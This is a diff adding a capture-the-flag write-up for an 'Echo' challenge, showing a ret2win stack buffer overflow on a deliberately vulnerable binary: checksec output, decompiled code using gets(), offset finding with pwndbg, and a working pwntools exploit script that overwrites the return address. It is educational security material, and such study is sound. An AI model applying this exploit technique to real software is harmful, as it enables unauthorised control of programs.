@@ -22,6 +22,7 @@ In this file, I’ll walk through the challenges I solved during the event, prov
 - [Challenge 10: Either Or](#challenge-10-either-or)
 - [Challenge 11: Math For Me](#challenge-11-math-for-me)
 - [Challenge 12: Letter2nums](#challenge-12-letter2nums)
+- [Challenge 13: Echo](#Challenge-13-Echo)
 - [Conclusion](#conclusion)
 ---
 
@@ -1025,6 +1026,175 @@ This will return the flag to us:
 ```bash
 flag{3b050f5a716e51c89e9323baf3a7b73b}
 ```
+
+## Challenge 13: Echo
+
+I have attached this static binary in the GitHub repo main area.
+### Problem Description
+
+Author: @awesome10billion
+
+I made my own echo program. my own echo program.
+
+Download the file(s) below.
+Attachments: echo
+
+### Solution
+
+Checking the file reveals it is an ELF binary:
+```bash
+┌──(root㉿kali)-[/home/kali/SNYK]
+└─# file echo
+echo: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ba71fb7825c88b04e13afe6dcc11ba9113394f12, for GNU/Linux 3.2.0, not stripped
+```
+
+Running checksec against the binary tells us there is no protections in-place:
+```bash
+┌──(root㉿kali)-[/home/kali/SNYK]
+└─# pwn checksec echo
+[*] '/home/kali/SNYK/echo'
+    Arch:       amd64-64-little
+    RELRO:      No RELRO
+    Stack:      No canary found
+    NX:         NX unknown - GNU_STACK missing
+    PIE:        No PIE (0x400000)
+    Stack:      Executable
+    RWX:        Has RWX segments
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+```
+
+I attempted to run the program with a TON of input to see if I would hit a segmentation fault, which it does, and this tells us that a buffer overflow is present:
+```bash
+┌──(root㉿kali)-[/home/kali/SNYK]
+└─# ./echo 
+Give me some text and I'll echo it back to you: 
+ddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd
+ddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd
+zsh: segmentation fault  ./echo
+```
+
+We can open the binary with GHIDRA to see its source code- get a look at the functions:
+
+![image](https://github.com/user-attachments/assets/627e3862-19ed-486e-8c43-522485b6b458)
+
+
+This is not a very big program and the non-standard naming conventions of the functions may reveal some of the functionality within.
+
+Main function:
+```c
+undefined8 main(EVP_PKEY_CTX *param_1)  
+  
+{  
+char local_88 [128];  
+  
+init(param_1);  
+puts("Give me some text and I\'ll echo it back to you: ");  
+gets(local_88);  
+puts(local_88);  
+return 0;  
+}
+```
+
+The win function:
+```c
+void win(void)  
+  
+{  
+int iVar1;  
+FILE *__stream;  
+char local_11;  
+  
+__stream = fopen("flag.txt","r");  
+if (__stream != (FILE *)0x0) goto LAB_0040126a;  
+puts("Please create \'flag.txt\' in this directory with your own debugging flag.");  
+FUN_00401120(0);  
+do {  
+putchar((int)local_11);  
+LAB_0040126a:  
+iVar1 = fgetc(__stream);  
+local_11 = (char)iVar1;  
+} while (local_11 != -1);  
+fclose(__stream);  
+return;  
+}
+```
+
+This is a Ret2Win challenge: where you exploit a buffer overflow vulnerability to gain control over the program's execution flow. The goal is to overwrite the return address on the stack so that when the function returns, it jumps to the `win()` function (or a similar function that provides access to the flag or other sensitive data).
+
+First we need to calculate the offset. You can use `pwndbg` for that.
+
+**pwndbg** is a **GDB** (GNU Debugger) plugin designed to enhance the debugging experience for security researchers and reverse engineers, especially in the context of exploiting binaries. It provides a variety of additional features that simplify and speed up tasks like analyzing buffer overflows, reverse engineering, and performing exploits.
+
+Installation instructions (pwndbg is typically installed via GitHub and integrated directly into GDB):
+```bash
+git clone https://github.com/pwndbg/pwndbg
+cd pwndbg
+./setup.sh
+```
+
+The **offset** in the context of a buffer overflow attack is the number of bytes that need to be written in order to overflow the buffer and reach the **return address** on the stack. This is a critical value because once the buffer is overflowed, the excess data can overwrite the return address, allowing you to control the program's execution flow.
+
+```python
+pwndbg echo
+cyclic 200 # since buffer is 128 in size
+run
+(paste the cyclic pattern and hit enter)
+```
+
+![image](https://github.com/user-attachments/assets/a003cccf-c0fc-4a48-9519-cae98423dcce)
+
+
+
+Notice the RSP register's address is overloaded with characters:
+
+![image](https://github.com/user-attachments/assets/9a4af2eb-ad1e-4a8d-ad26-b46a031a96f5)
+
+Copy the pattern ‘raaaaaaa’ and run `cyclic -l raaaaaaa`:
+
+![image](https://github.com/user-attachments/assets/61357702-d874-4cc8-892b-940abbac74ed)
+
+
+Now that we have that offset information at 136, we need the `win()` function's address. You can find it manually using `pwndbg` (or gef, gdb, etc) by opening the binary and running `info functions` and we will see `win()` at this memory address `0x0000000000401216`:
+
+![image](https://github.com/user-attachments/assets/cfd48767-8922-40e5-809e-1906db8de36c)
+
+
+Now with everything in place we can overflow the buffer and get the flag by automating this exploitation with Python:
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+
+# Load the ELF file
+elf = ELF('./echo')
+
+# Offset and target address
+offset = 136
+target_address = elf.symbols['win']
+
+# Craft the payload
+payload = b'A' * offset + p64(target_address)
+print(payload)
+
+# If it's a local binary, use the following:
+conn = process('./echo')
+
+# Connect to the remote service (if needed)
+#conn = remote('challenge.ctf.games', 31084)
+
+# Send the payload
+conn.sendline(payload)
+
+# Interact with the shell (if successful)
+conn.interactive()
+
+```
+
+Now you will see the flag returned to you (if this were a remote server, otherwise it will ask you to create a flag.txt file):
+
+![image](https://github.com/user-attachments/assets/87e87207-7d02-4f5a-bfc0-82eaee138cce)
 
 ---
 
